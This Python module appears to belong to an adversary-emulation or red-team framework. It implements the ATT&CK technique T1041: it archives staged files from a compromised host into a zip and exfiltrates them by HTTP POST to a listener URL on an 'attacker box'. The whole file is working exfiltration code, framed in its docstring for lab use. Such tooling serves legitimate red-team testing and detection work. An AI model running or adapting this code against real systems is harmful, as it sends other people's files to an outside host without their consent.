"""
techniques/exfiltration/http_exfil.py
ATT&CK: T1041 — Exfiltration Over C2 Channel
         T1560 — Archive Collected Data (staging step)
Tactic:  Exfiltration

Stages files from the Context's staged_files list into a zip archive,
then exfiltrates the archive to a listener URL via HTTP POST.
In a lab context, the "listener" is a simple netcat or Python HTTP
server you run on your Kali/attacker box.
"""

import io
import os
import zipfile
from typing import Any

import requests

from core.context import Context
from core.technique import Tactic, Technique


class HTTPExfil(Technique):
    name = "http-exfil"
    attack_id = "T1041"
    tactic = Tactic.EXFILTRATION

    def __init__(
        self,
        listener_url: str,
        archive_name: str = "collected.zip",
        timeout: float = 10.0,
    ):
        self.listener_url = listener_url
        self.archive_name = archive_name
        self.timeout = timeout

    def _build_archive(self, paths: list[str]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for path in paths:
                if os.path.isfile(path):
                    zf.write(path, arcname=os.path.basename(path))
        return buf.getvalue()

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        staged = [sf.path for sf in context.staged_files]
        existing = [p for p in staged if os.path.isfile(p)]

        if not existing:
            return False, "No staged files found in Context to exfiltrate", {
                "staged_files": staged,
                "files_found": [],
            }

        archive_bytes = self._build_archive(existing)

        try:
            resp = requests.post(
                self.listener_url,
                files={"file": (self.archive_name, archive_bytes, "application/zip")},
                timeout=self.timeout,
            )
            success = resp.status_code < 400
            summary = (
                f"Exfiltrated {len(existing)} file(s) ({len(archive_bytes)} bytes) "
                f"to {self.listener_url} — HTTP {resp.status_code}"
            )
            return success, summary, {
                "listener_url": self.listener_url,
                "files_exfiltrated": existing,
                "archive_size_bytes": len(archive_bytes),
                "http_status": resp.status_code,
            }
        except requests.RequestException as exc:
            return False, f"Exfiltration request failed: {exc}", {
                "listener_url": self.listener_url,
                "files_staged": existing,
                "error": str(exc),
            }
